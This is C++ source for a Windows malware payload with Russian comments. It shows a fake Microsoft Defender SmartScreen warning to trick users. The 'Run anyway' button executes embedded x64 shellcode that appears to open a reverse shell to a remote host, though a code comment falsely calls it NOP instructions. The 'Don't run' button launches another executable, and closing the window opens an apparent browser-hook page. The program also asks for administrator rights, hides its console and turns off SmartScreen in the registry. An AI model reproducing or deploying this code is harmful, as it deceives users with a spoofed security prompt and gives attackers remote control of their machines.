// Шах и мат: Эта нагрузка создает приложение с графическим интерфейсом (GUI), которое имитирует предупреждение Windows SmartScreen (поддельный SmartScreen). Оно спроектировано так, чтобы выглядеть как сообщение предупреждения SmartScreen, чтобы обмануть пользователя и заставить его взаимодействовать с ним. Приложение включает функции для запуска шеллкода и выполнения определенных действий на основе ввода пользователя. Вот разбор:

// Кнопки:

// "Don't Run" (Не запускать): Запускает нагрузку (payload.exe) из любого каталога, например, C:\\Windows\\System32.

// "Run Anyway" (Запустить в любом случае): Выполняет заранее определенный шеллкод.

// "X": Закрывает окно предупреждения и открывает любой URL, например, https://t.me/BearC2.

// Скрытая функциональность:

// Обход SmartScreen: Код пытается отключить SmartScreen, изменяя настройки реестра.

// Проверка административных прав: Если приложение не работает с административными правами, оно пытается перезапустить себя с повышенными правами.

//---------------------------------------------------------------------------------------------------------

// Автор: S3N4T0R

// Дата: 2024-7-24

// manual compile: x86_64-w64-mingw32-g++ -static-libgcc -static-libstdc++ -o Шахимат.exe Шахимат.cpp  -lole32 -lcomctl32 -lshlwapi -loleaut32 -luuid -lcomdlg32 -lgdi32 -luser32 -lkernel32 -lshell32


#include <windows.h>
#include <tchar.h>
#include <iostream>
#include <shellapi.h>

// Shellcode containing NOP (No Operation) instructions
unsigned char shellcode[] = {
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00,
    0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41,
    0x89, 0xda, 0xff, 0xd5, 0x20, 0x48, 0x8b, 0x72,
    0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41,
    0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
    0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67,
    0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56,
    0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24,
    0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41,
    0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
    0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83,
    0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff,
    0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32,
    0x5f, 0x33, 0x32, 0x00, 0x00, 0x41, 0x56, 0x49,
    0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00,
    0x00, 0x49, 0x89, 0xe5, 0x49, 0xbc, 0x02, 0x00,
    0x04, 0xbd, 0xc0, 0xa8, 0x00, 0x87, 0x41, 0x54,
    0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba,
    0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x4c, 0x89,
    0xea, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41,
    0xba, 0x29, 0x80, 0x6b, 0x00, 0xff, 0xd5, 0x50,
    0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48,
    0xff, 0xc0, 0x48, 0x89, 0xc2, 0x48, 0xff, 0xc0,
    0x48, 0x89, 0xc1, 0x41, 0xba, 0xea, 0x0f, 0xdf,
    0xe0, 0xff, 0xd5, 0x48, 0x89, 0xc7, 0x6a, 0x10,
    0x41, 0x58, 0x4c, 0x89, 0xe2, 0x48, 0x89, 0xf9,
    0x41, 0xba, 0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5,
    0x48, 0x81, 0xc4, 0x40, 0x02, 0x00, 0x00, 0x49,
    0xb8, 0x63, 0x6d, 0x64, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x41, 0x50, 0x41, 0x50, 0x48, 0x89, 0xe2,
    0x57, 0x57, 0x57, 0x4d, 0x31, 0xc0, 0x6a, 0x0d,
    0x59, 0x41, 0x50, 0xe2, 0xfc, 0x66, 0xc7, 0x44,
    0x24, 0x54, 0x01, 0x01, 0x48, 0x8d, 0x44, 0x24,
    0x18, 0xc6, 0x00, 0x68, 0x48, 0x89, 0xe6, 0x56,
    0x50, 0x41, 0x50, 0x41, 0x50, 0x41, 0x50, 0x49,
    0xff, 0xc0, 0x41, 0x50, 0x49, 0xff, 0xc8, 0x4d,
    0x89, 0xc1, 0x4c, 0x89, 0xc1, 0x41, 0xba, 0x79,
    0xcc, 0x3f, 0x86, 0xff, 0xd5, 0x48, 0x31, 0xd2,
    0x48, 0xff, 0xca, 0x8b, 0x0e, 0x41, 0xba, 0x08,
    0x87, 0x1d, 0x60, 0xff, 0xd5, 0xbb, 0xf0, 0xb5,
    0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d,
    0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06,
    0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
    0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41,
    0x89, 0xda, 0xff, 0xd5, // NOP instructions
};

// Function to check if the current program is running with administrator privileges
bool IsAdmin() {
    BOOL fIsRunAsAdmin = FALSE;
    PSID pAdministratorsGroup = NULL;

    // Define the SID for the Administrators group
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &pAdministratorsGroup)) {
        // Check if the token has the specified SID
        CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin);
        // Free the allocated SID
        FreeSid(pAdministratorsGroup);
    }
    return fIsRunAsAdmin;
}

// Function to re-launch the current program with administrator privileges
void RunAsAdmin() {
    SHELLEXECUTEINFO sei = { sizeof(sei) };
    sei.lpVerb = _T("runas"); // Verb to request elevation
    sei.lpFile = _T(__argv[0]); // Program to be elevated
    sei.hwnd = NULL;
    sei.nShow = SW_HIDE; // Hide the console window

    if (!ShellExecuteEx(&sei)) {
        DWORD dwStatus = GetLastError();
        if (dwStatus == ERROR_CANCELLED) {
            std::wcout << L"The user refused to elevate privileges.\n";
        }
        else {
            std::wcout << L"An unknown error occurred: " << dwStatus << L"\n";
        }
    }
}

// Function to disable the SmartScreen filter by modifying the Windows registry
void TurnOffSmartScreen() {
    HKEY hKey;
    // Open the registry key
    LONG lRes = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer"), 0, KEY_SET_VALUE, &hKey);
    if (lRes == ERROR_SUCCESS) {
        DWORD dwValue = 0;
        // Set the SmartScreenEnabled value to 0
        lRes = RegSetValueEx(hKey, _T("SmartScreenEnabled"), 0, REG_DWORD, (const BYTE*)&dwValue, sizeof(dwValue));
        if (lRes == ERROR_SUCCESS) {
            std::wcout << L"Successfully turned off the SmartScreen filter.\n";
        }
        else {
            std::wcout << L"Failed to modify the registry: " << lRes << L"\n";
        }
        RegCloseKey(hKey);
    }
    else {
        std::wcout << L"Failed to open the registry key: " << lRes << L"\n";
    }
}

// Function to allocate memory for the shellcode and execute it
void ExecuteShellcode() {
    LPVOID exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
}

// Function to open a URL in the default web browser
void OpenURL(const wchar_t* url) {
    ShellExecuteW(0, 0, url, 0, 0, SW_SHOW);
}

// Global variables for brushes and fonts used in the GUI
HBRUSH hBrushBackground = NULL;
HBRUSH hBrushTextBackground = NULL;
HFONT hFontBold20 = NULL;
HFONT hFontBold12 = NULL;
HFONT hFontLarge = NULL; // New font for larger text

// Window procedure function to handle window messages
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_DESTROY:
        OpenURL(L"http://192.168.1.10:3000/demos/butcher/index.html"); 
        PostQuitMessage(0);
        return 0;

    case WM_CREATE: {
        // Create fonts for the text in the window
        hFontBold20 = CreateFontW(20, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, VARIABLE_PITCH, L"Arial");
        hFontBold12 = CreateFontW(12, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, VARIABLE_PITCH, L"Arial");
        hFontLarge = CreateFontW(24, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, VARIABLE_PITCH, L"Arial"); // Larger font

        // Create static text controls
        HWND hStatic1 = CreateWindowW(L"STATIC", L"Windows protected your PC", WS_VISIBLE | WS_CHILD | SS_LEFT, 20, 20, 460, 40, hwnd, NULL, NULL, NULL);
        HWND hStatic2 = CreateWindowW(L"STATIC", L"Microsoft Defender SmartScreen prevented an unrecognized app from starting.", WS_VISIBLE | WS_CHILD | SS_LEFT, 20, 60, 460, 20, hwnd, NULL, NULL, NULL);
        HWND hStatic3 = CreateWindowW(L"STATIC", L"Running this app might put your PC at risk.", WS_VISIBLE | WS_CHILD | SS_LEFT, 20, 80, 460, 20, hwnd, NULL, NULL, NULL);
        CreateWindowW(L"STATIC", L"More info", WS_VISIBLE | WS_CHILD | SS_LEFT, 20, 100, 460, 20, hwnd, NULL, NULL, NULL);

        // Set the large font for the first static text control
        SendMessageW(hStatic1, WM_SETFONT, (WPARAM)hFontLarge, TRUE);

        // Create buttons for user interaction
        CreateWindowW(L"BUTTON", L"Run anyway", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON, 390, 450, 120, 30, hwnd, (HMENU)1, NULL, NULL);
        CreateWindowW(L"BUTTON", L"Don't run", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON, 260, 450, 120, 30, hwnd, (HMENU)2, NULL, NULL);
        CreateWindowW(L"BUTTON", L"x", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON, 490, 0, 40, 30, hwnd, (HMENU)3, NULL, NULL);

        // Set fonts for the buttons
        SendMessageW(GetDlgItem(hwnd, 1), WM_SETFONT, (WPARAM)hFontBold12, TRUE);
        SendMessageW(GetDlgItem(hwnd, 2), WM_SETFONT, (WPARAM)hFontBold12, TRUE);
        SendMessageW(GetDlgItem(hwnd, 3), WM_SETFONT, (WPARAM)hFontBold12, TRUE);

        // Create brushes for background colors
        hBrushBackground = CreateSolidBrush(RGB(0, 90, 158));
        hBrushTextBackground = CreateSolidBrush(RGB(0, 90, 158));
        SetClassLongPtr(hwnd, GCLP_HBRBACKGROUND, (LONG_PTR)hBrushBackground);

        return 0;
    }

    case WM_CTLCOLORSTATIC: {
        HDC hdcStatic = (HDC)wParam;
        SetTextColor(hdcStatic, RGB(255, 255, 255)); // Set text color to white
        SetBkMode(hdcStatic, TRANSPARENT); // Set background mode to transparent
        return (INT_PTR)hBrushTextBackground;
    }

    case WM_COMMAND:
        if (LOWORD(wParam) == 1) {
            ExecuteShellcode(); // Execute the shellcode
            MessageBoxW(hwnd, L"The shellcode has been executed.", L"Info", MB_OK);
        }
        else if (LOWORD(wParam) == 2) {
            ShellExecuteW(NULL, L"open", L"C:\\Windows\\System32\\кинжал.exe", NULL, NULL, SW_SHOWNORMAL);
        }
        else if (LOWORD(wParam) == 3) {
            DestroyWindow(hwnd); // Close the window
        }
        return 0;
    }

    return DefWindowProcW(hwnd, uMsg, wParam, lParam);
}

// Main function to create the GUI and handle the program flow
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Hide the console window
    HWND hwndConsole = GetConsoleWindow();
    if (hwndConsole) {
        ShowWindow(hwndConsole, SW_HIDE);
    }

    // Check if the program is running with administrator privileges
    if (!IsAdmin()) {
        RunAsAdmin(); // Request administrator privileges
        return 0;
    }

    const wchar_t CLASS_NAME[] = L"Sample Window Class";
    WNDCLASSW wc = {};

    wc.lpfnWndProc = WindowProc; // Window procedure function
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;

    RegisterClassW(&wc);

    // Calculate window position and size
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    int windowWidth = 529;
    int windowHeight = 500;
    int xPosition = (screenWidth - windowWidth) / 2;
    int yPosition = (screenHeight - windowHeight) / 2;

    // Create the main window
    HWND hwnd = CreateWindowExW(
        0,
        CLASS_NAME,
        L"Windows SmartScreen",
        WS_POPUP,  // Use WS_POPUP to remove the window border
        xPosition, yPosition, windowWidth, windowHeight,
        NULL,
        NULL,
        hInstance,
        NULL
    );

    if (hwnd == NULL) {
        return 0;
    }

    ShowWindow(hwnd, SW_SHOW);

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup allocated resources
    DeleteObject(hBrushBackground);
    DeleteObject(hBrushTextBackground);
    DeleteObject(hFontBold20);
    DeleteObject(hFontBold12);
    DeleteObject(hFontLarge); // Cleanup the large font

    return 0;
}
